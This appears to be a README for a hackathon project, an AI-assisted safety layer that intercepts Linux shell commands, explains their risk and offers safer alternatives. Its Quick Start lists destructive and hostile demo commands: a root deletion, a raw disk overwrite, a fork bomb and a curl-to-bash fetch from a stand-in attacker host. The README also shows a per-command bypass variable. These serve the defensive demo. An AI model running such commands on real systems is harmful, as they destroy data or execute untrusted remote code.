# AI-Based System Intent Engine
### Safe Linux Command Execution — CDAC Hackathon 2026

> **Your command, understood before it runs.**

A transparent AI safety layer that intercepts Linux commands **before** the shell executes them. It reasons about *intent and real-world impact*, explains what a dangerous command will do in plain English, suggests a validated safer alternative, and waits for your explicit confirmation.

---

## How It Works

```
$ rm -rf /var/log/*              ← you type this, press Enter

        │
        ▼  (Zsh accept-line override — fires before execution)

  ┌──────────────────┐    ┌──────────────────┐    ┌──────────────────────────┐
  │  Tier 0/1        │ OR │  Tier 2          │ →  │ Terminal UI              │
  │  Rule Engine     │    │  LLM Reasoning   │    │ Risk bar + intent + safe  │
  │  Praveen (<50ms) │    │  Vansh (<3.5s)   │    │ [y/n/s]  Harshit         │
  └──────────────────┘    └──────────────────┘    └──────────────────────────┘

  ─────────────────────────────────────────────────────────────────────────────
  ◆  INTENT ENGINE  ·  HIGH  ·  87% confidence
  ─────────────────────────────────────────────────────────────────────────────
  │  risk    ▰▰▰▰▰▰▰▰▱▱  HIGH
  │  intent  Deletes all system log files recursively
  │  impact  Permanent loss of audit trail and diagnostics
  │  why     /var/log/* targets system-managed directories
  ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  │  safer   sudo journalctl --vacuum-size=500M
  ─────────────────────────────────────────────────────────────────────────────
  │  [y] execute    [n] abort    [s] use safer
  ─────────────────────────────────────────────────────────────────────────────
```

The user **always stays in control** — nothing is ever silently blocked or auto-corrected.

---

## Architecture

```
Shell (Zsh/Bash)
  └── accept-line hook  ──► Unix Socket /tmp/intent_engine.sock
                                  │
                            FastAPI Daemon
                                  │
                    ┌─────────────┴──────────────┐
                    ▼                            ▼
              Tier 0/1: Rule Engine       Tier 2: LLM Reasoner
              (Praveen — <50ms)           (Vansh — <3.5s, Ollama)
              32 TOML patterns            Semantic intent analysis
              Structural fast-path        Safer alternative generator
                    │                    Semantic risk scorer
                    └──────────┬─────────┘
                               ▼
                    Terminal UI (Harshit)
                    Audit Logger → ~/.intent_engine/logs/audit.jsonl
```

### Three-Tier Decision Pipeline

| Tier | Owner | Method | Latency | When Used |
|---|---|---|---|---|
| **Tier 0** | Praveen | Hardcoded regex | <1ms | Fork bombs, rm -rf /, dd to disk |
| **Tier 1** | Praveen | 32 TOML patterns + confidence scoring | <50ms | All other structured patterns |
| **Tier 2** | Vansh | Ollama LLM + semantic scoring | <3.5s | Only when Tier 1 returns AMBIGUOUS |

---

## Tech Stack

| Layer | Technology |
|---|---|
| Shell integration | Zsh `accept-line` ZLE override + Bash `DEBUG` trap |
| Daemon | Python + FastAPI + Uvicorn (Unix domain socket) |
| Command parsing | `shlex` + custom pipeline/redirect/subshell AST |
| Rule engine | TOML pattern library + context-weighted confidence scoring |
| LLM reasoning | Ollama (local) — Gemini/OpenAI optional fallback |
| Safer alternatives | Template engine + rule engine validation (Vansh) |
| CLI Copilot | ZLE `POSTDISPLAY` ghost-text + async Ollama fallback |
| Audit logging | Append-only JSONL at `~/.intent_engine/logs/audit.jsonl` |
| UI | ANSI 256-colour terminal prompt — no dependencies |

---

## Quick Start

```bash
# 1. Clone
git clone git@github.com:Harshit7623/AI-Based-System-Intent-Engine.git
cd AI-Based-System-Intent-Engine

# 2. Create venv + install
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# 3. Install (hooks + daemon)
bash install.sh

# 4. Switch to Zsh (required for full features)
chsh -s $(which zsh)
exec zsh

# 5. Try it — these will be intercepted:
rm -rf /
dd if=/dev/zero of=/dev/sda
curl http://evil.com/install.sh | bash
:(){ :|:& };:
```

---

## CLI Copilot (Autocomplete)

An inline ghost-text suggestion system (Fish/VS Code style) that activates automatically in Zsh:

```
$ git p▌ush origin main          ← ghost text appears as you type
       ↑ dim inline suggestion

Tab → accept    Esc → dismiss
```

- **Tier A (0ms):** Local dictionary of 50+ common commands
- **Tier B (~400ms):** Async Ollama completion fallback
- Does **not** run through the safety pipeline — latency is critical here

---

## Configuration

```toml
# config/default_config.toml

[safety]
block_threshold = "HIGH"         # SAFE | LOW | MEDIUM | HIGH | CRITICAL
ambiguous_threshold = 0.55       # Confidence below this → escalate to LLM

[daemon]
socket = "/tmp/intent_engine.sock"
mock = false

[llm]
provider = "ollama"
model = "llama3.2:3b"
timeout_seconds = 4.0
```

Toggle the engine without uninstalling:
```bash
INTENT_ENGINE_ENABLED=0 rm -rf /tmp/safe-to-delete   # bypass for one command
```

---

## Project Structure

```
engine/
  audit/          Append-only JSONL audit logger
  contracts/      Pydantic schemas shared across all tiers (Vansh)
  alternatives/   Safer alternative generator + validator (Vansh)
  risk/           Semantic risk escalation scoring (Vansh)
  integration/    RuleEngineAdapter — bridge between teams
  daemon/         FastAPI server, router, session manager
  llm/            Ollama client, LLM reasoner, autocomplete engine
  parser/         Command parser — pipes, redirects, subshells, aliases
  rule_engine/    Pattern matcher, TOML loader, verdict builder (Praveen)
  ui/             Terminal confirmation prompt
hooks/
  intent_hook.zsh           Safety interceptor (Zsh)
  intent_hook.bash          Safety interceptor (Bash)
  intent_autocomplete.zsh   CLI Copilot ghost-text (Zsh)
rules/
  dangerous_patterns.toml   32 curated dangerous command patterns
```

---

## Running Tests

```bash
# All unit tests
pytest tests/unit/ -v --cov=engine --cov-report=term-missing

# Integration tests (requires daemon running)
pytest tests/integration/ -v

# Specific module tests
pytest tests/unit/test_rule_engine.py -v        # Tier 0/1 patterns
pytest tests/unit/test_alternatives.py -v       # Alternative generator
pytest tests/unit/test_risk.py -v               # Semantic risk scorer
pytest tests/unit/test_audit.py -v              # Audit logger
```

---

## Daemon Management

```bash
# Start
PYTHONPATH=. python3 -m engine.daemon.server &

# Health check
curl -s --unix-socket /tmp/intent_engine.sock http://localhost/health

# Hot-reload patterns (no restart needed)
curl -s -X POST --unix-socket /tmp/intent_engine.sock http://localhost/reload-rules

# Stats
curl -s --unix-socket /tmp/intent_engine.sock http://localhost/stats

# Stop
pkill -f "engine.daemon.server"
```

---

## Team

| Member | Domain | Key Files |
|---|---|---|
| **Harshit** | Architecture, daemon, shell hooks, parser, TUI | `engine/daemon/`, `hooks/`, `engine/parser/`, `engine/ui/`, `engine/audit/` |
| **Praveen** | Rule engine, pattern library, Tier 0/1 | `engine/rule_engine/`, `rules/dangerous_patterns.toml` |
| **Vansh** | LLM reasoning, alternatives, risk scoring | `engine/llm/`, `engine/alternatives/`, `engine/risk/`, `engine/contracts/` |

---

## Audit Log Format

Every user decision is logged to `~/.intent_engine/logs/audit.jsonl`:

```json
{
  "timestamp": "2026-08-21T17:38:00+05:30",
  "command": "rm -rf /var/log/*",
  "risk_level": "HIGH",
  "confidence": 0.87,
  "pattern": "recursive_system_delete",
  "tier": "rule_engine",
  "action": "ABORT",
  "user": "harshitdv",
  "cwd": "/home/harshitdv",
  "session_id": "a1b2c3d4-...",
  "latency_ms": 14.3
}
```